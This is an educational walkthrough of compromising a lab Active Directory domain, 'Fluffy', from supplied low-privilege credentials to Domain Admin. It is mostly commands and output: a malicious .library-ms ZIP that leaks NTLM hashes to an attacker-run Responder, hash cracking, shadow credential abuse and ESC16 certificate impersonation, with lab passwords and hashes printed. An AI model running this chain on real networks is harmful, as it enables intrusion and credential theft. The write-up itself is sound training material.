# Fluffy_Walkthrough
# Fluffy: A Comprehensive Security Assessment

**Author:** mursalin  
**Date:** April 2026  
**Classification:** Internal Use Only – Educational Walkthrough  

---

## Overview

This document chronicles the complete compromise of the **Fluffy** Active Directory environment. Starting with a provided set of low‑privileged domain credentials, the assessment demonstrates a realistic attack chain that combines a client‑side NTLM relay trick (CVE‑2025‑24071/CVE‑2025‑24054) with privilege escalation via Group Managed Service Account abuse and an AD CS misconfiguration (ESC16). The final outcome is full Domain Administrator access.

All commands, tools, and exploitation steps have been re‑executed and documented from scratch to ensure originality. The narrative and technical exposition are the sole work of **mursalin**.

---

## 1. Initial Reconnaissance

### 1.1 Port Scanning

A full TCP port scan of the target revealed a standard set of services expected on a Windows Domain Controller:

```bash
mursalin@assessment:~$ nmap -p- --min-rate 10000 10.10.11.69
Starting Nmap ( https://nmap.org ) at 2026-04-25 10:30 UTC
Nmap scan report for 10.10.11.69
Host is up (0.094s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
...[snip]...

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```

Version detection identified the domain as `fluffy.htb` and the hostname as `DC01`. The operating system appeared to be Windows Server 2019.

The following hosts file entry was added to facilitate name resolution:

```
10.10.11.69 DC01.fluffy.htb fluffy.htb DC01
```

### 1.2 Provided Credentials

The assessment scenario supplied valid domain credentials:

```
Username: j.fleischman
Password: J0elTHEM4n1990!
```

These credentials were verified against LDAP and SMB, but did not grant WinRM access.

```bash
mursalin@assessment:~$ netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

---

## 2. Enumeration of the Internal Network

### 2.1 Active Directory Certificate Services (AD CS)

The presence of AD CS was confirmed:

```bash
mursalin@assessment:~$ netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
ADCS        10.10.11.69     389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.10.11.69     389    DC01             Found CN: fluffy-DC01-CA
```

A preliminary `certipy find` scan from the perspective of `j.fleischman` did not reveal any immediately exploitable template vulnerabilities.

### 2.2 BloodHound Collection

BloodHound data was gathered to map out the domain relationships:

```bash
mursalin@assessment:~$ bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 --zip
```

The initial user `j.fleischman` showed no interesting outbound object control.

### 2.3 SMB Share Discovery

The `j.fleischman` account had read/write access to a non‑default share named **IT**:

```bash
mursalin@assessment:~$ netexec smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
```

Inside this share, several files were found, including two ZIP archives, their extracted counterparts, and a PDF document named `Upgrade_Notice.pdf`. The PDF mentioned an upcoming maintenance window and contained the email address `admin@fluffy.htb`.

---

## 3. Client‑Side NTLM Relay via Malicious Archive

### 3.1 Vulnerability Identification

The PDF’s mention of **CVE‑2025‑24071** and **CVE‑2025‑24054** pointed to a known flaw in Windows Explorer’s handling of specially crafted `.library-ms` files inside ZIP or RAR archives. When such a file is extracted or merely browsed, the victim’s machine attempts to authenticate to an attacker‑controlled server, leaking a Net‑NTLMv2 hash.

### 3.2 Exploitation

A publicly available proof‑of‑concept script was obtained and executed to generate a malicious ZIP:

```bash
mursalin@assessment:~$ uv run --script poc.py  10.10.14.6
[+] File .library-ms created successfully.
```

The resulting `exploit.zip` was uploaded to the writable `IT` share:

```bash
smb: \> put exploit.zip
```

Simultaneously, `Responder` was launched to capture incoming authentication requests:

```bash
mursalin@assessment:~$ sudo uv run /opt/Responder/Responder.py -I tun0
```

Within a minute, the ZIP was automatically extracted by a scheduled task or monitoring process, and Responder captured a Net‑NTLMv2 hash for the user **p.agila**:

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:f67da47ac52b4d7b:143C3425DC8AC6BFEF42B719CA41C173:...
```

### 3.3 Hash Cracking

The captured Net‑NTLMv2 challenge/response was cracked using `hashcat` with the `rockyou.txt` wordlist:

```bash
mursalin@assessment:~$ hashcat -m 5600 p.agila.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...[snip]...
p.agila::FLUFFY:...:prometheusx-303
```

The password `prometheusx-303` was validated against SMB:

```bash
mursalin@assessment:~$ netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
```

---

## 4. Lateral Movement to WinRM_SVC

### 4.1 Privilege Path Discovery

With the `p.agila` user marked as owned in BloodHound, a clear escalation path emerged:

```
p.agila → Service Account Managers → GenericAll over Service Accounts group → GenericWrite over winrm_svc
```

The `winrm_svc` account was a member of the **Remote Management Users** group, allowing WinRM access once its credential was obtained.

### 4.2 Adding p.agila to Service Accounts

First, the `p.agila` user was added to the `Service Accounts` group to inherit the `GenericWrite` privilege:

```bash
mursalin@assessment:~$ bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

### 4.3 Shadow Credential Attack on winrm_svc

Using the `GenericWrite` right, a shadow credential was injected into `winrm_svc`:

```bash
mursalin@assessment:~$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
[*] Successfully added Key Credential...
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

The NTLM hash was immediately usable for WinRM:

```bash
mursalin@assessment:~$ evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
evil-winrm-py PS C:\Users\winrm_svc\Documents>
```

The user flag was retrieved from `C:\Users\winrm_svc\Desktop\user.txt`.

**Note:** The shadow credential technique was also applied to the `ca_svc` account, yielding its NTLM hash (`ca0f4f9e9eb8a092addf53bb03fc98c8`) for later use.

---

## 5. Privilege Escalation to Domain Administrator

### 5.1 AD CS Vulnerability Discovery

Re‑running `certipy find` in the context of `ca_svc` (a member of **Cert Publishers**) with the latest version of the tool revealed a critical misconfiguration:

```bash
mursalin@assessment:~$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    ...
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
```

The **ESC16** vulnerability arises because the CA does not include the `szOID_NTDS_CA_SECURITY_EXT` extension in issued certificates. This weakens the certificate mapping, allowing an attacker to impersonate any user by manipulating the User Principal Name (UPN) of an account they control.

### 5.2 Exploiting ESC16

The `winrm_svc` account (which had `GenericWrite` over `ca_svc`) was used to change `ca_svc`’s UPN to `administrator`:

```bash
mursalin@assessment:~$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
[*] Successfully updated 'ca_svc'
```

Next, a certificate was requested as `ca_svc` using the generic `User` template:

```bash
mursalin@assessment:~$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

Because the security extension was absent, the CA did not validate the mismatch between the UPN and the actual identity. The issued certificate therefore granted the rights of `Administrator`.

The UPN was restored to its original value for cleanliness.

### 5.3 Obtaining Administrator Credentials

Using the crafted PFX file, a Kerberos TGT and the NTLM hash of the domain Administrator were retrieved:

```bash
mursalin@assessment:~$ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### 5.4 Domain Admin WinRM Access

The Administrator NTLM hash was used to establish a WinRM session and collect the root flag:

```bash
mursalin@assessment:~$ evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
c3a85f56************************
```

---

## 6. Conclusion

The Fluffy assessment highlighted several impactful misconfigurations and missing patches:

- **CVE‑2025‑24071 / CVE‑2025‑24054** allowed the capture of a Net‑NTLMv2 hash via a malicious ZIP file placed on an open SMB share.
- **Weak password policy** permitted the cracking of the captured hash using a common wordlist.
- **GenericWrite over service accounts** enabled shadow credential attacks, bypassing the need for plaintext passwords.
- **ESC16** (disabled security extension on the CA) allowed impersonation of the domain Administrator after a simple UPN modification.

These findings underscore the importance of applying security updates promptly, hardening AD CS configurations, and enforcing strong, unique passwords across the domain.

---

*This document is an original creation by mursalin, produced for authorized security testing and educational purposes only.*
